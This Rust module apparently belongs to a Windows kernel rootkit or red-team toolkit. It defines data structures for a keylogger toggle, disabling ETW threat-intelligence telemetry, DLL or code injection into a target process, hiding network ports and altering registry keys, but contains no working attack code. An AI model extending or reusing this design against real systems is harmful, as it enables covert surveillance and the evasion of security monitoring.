#![allow(non_camel_case_types)]
#![allow(non_snake_case)]

use crate::enums::Options;
use crate::enums::{PortType, Protocol};

pub use {
    callback::*, 
    driver::*,
    module::*, 
    process::*,
    thread::*,
};

pub mod callback;
pub mod driver;
pub mod module;
pub mod process;
pub mod thread;

/// Custom implementation of the `LIST_ENTRY` structure.
///
/// This struct represents a doubly linked list entry, commonly used in low-level
/// systems programming, especially in Windows kernel structures. It contains
/// forward (`Flink`) and backward (`Blink`) pointers to other entries in the list.
#[repr(C)]
#[derive(Debug, Clone, Copy)]
pub struct LIST_ENTRY {
    /// A pointer to the next entry in the list.
    pub Flink: *mut LIST_ENTRY,
    
    /// A pointer to the previous entry in the list.
    pub Blink: *mut LIST_ENTRY,
}

/// Represents the state of the keylogger system.
///
/// This struct is used to manage whether the keylogger functionality is enabled
/// or disabled. The `enable` field indicates if the keylogger is active.
#[repr(C)]
#[derive(Debug)]
pub struct Keylogger {
    /// A boolean value indicating if the keylogger is enabled (`true`) or disabled (`false`).
    pub enable: bool,
}

/// Represents the state of ETWTI (Event Tracing for Windows Thread Information).
///
/// This struct manages whether ETWTI is enabled or disabled for capturing thread
/// information. The `enable` field controls the activation of this feature.
#[repr(C)]
#[derive(Debug)]
pub struct ETWTI {
    /// A boolean value indicating if ETWTI is enabled (`true`) or disabled (`false`).
    pub enable: bool,
}

/// Input structure for enumeration of information.
///
/// This struct is used as input for listing various entities, based on the
/// options provided. The `options` field defines the parameters for the enumeration.
#[repr(C)]
#[derive(Debug)]
pub struct EnumerateInfoInput {
    /// The options to control how the enumeration should behave, typically set by the user.
    pub options: Options,
}

/// Represents the target process and path for a DLL or code injection.
///
/// This struct contains the necessary information to perform a code or DLL injection
/// into a target process. It includes the process identifier (PID) and the path
/// to the file or resource being injected.
#[repr(C)]
#[derive(Debug)]
pub struct TargetInjection {
    /// The process identifier (PID) of the target process where the injection will occur.
    pub pid: usize,
    
    /// The path to the file or resource (typically a DLL) to be injected into the process.
    /// This is a dynamic string (heap-allocated) that stores the full path.
    pub path: alloc::string::String,
}

/// Represents information about a network or communication port.
///
/// This struct holds information about a specific port, including the protocol used,
/// the type of port, its number, and whether the port is enabled or disabled. 
/// It is marked as `#[repr(C)]` for compatibility with C-style layouts, making it suitable for
/// FFI (Foreign Function Interface) and low-level systems programming.
#[repr(C)]
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct PortInfo {
    /// The protocol used by the port (e.g., TCP, UDP).
    /// This field is represented by the `Protocol` enum.
    pub protocol: Protocol,

    /// The type of port (e.g., open, filtered).
    /// This field is represented by the `PortType` enum.
    pub port_type: PortType,

    /// The port number, represented as a 16-bit unsigned integer.
    /// Commonly used to identify network services (e.g., port 80 for HTTP).
    pub port_number: u16,

    /// A boolean value indicating whether the port is enabled (`true`) or disabled (`false`).
    pub enable: bool,
}

/// Represents the target registry key and value for operations.
///
/// This struct holds information about a specific registry key and its associated value
/// for operations such as modifying or querying the registry. It includes the registry key,
/// the value associated with that key, and a flag indicating whether the operation should be
/// enabled or not.
#[repr(C)]
#[derive(Debug, Default)]
pub struct TargetRegistry {
    /// The registry key, represented as a dynamically allocated string.
    /// This is typically the path to a specific registry key (e.g., `HKEY_LOCAL_MACHINE\Software\...`).
    pub key: alloc::string::String,

    /// The value associated with the registry key, represented as a dynamically allocated string.
    /// This could be a string value stored under the specified registry key.
    pub value: alloc::string::String,

    /// A boolean value indicating whether the operation on the registry key should be enabled (`true`)
    /// or disabled (`false`).
    pub enable: bool,
}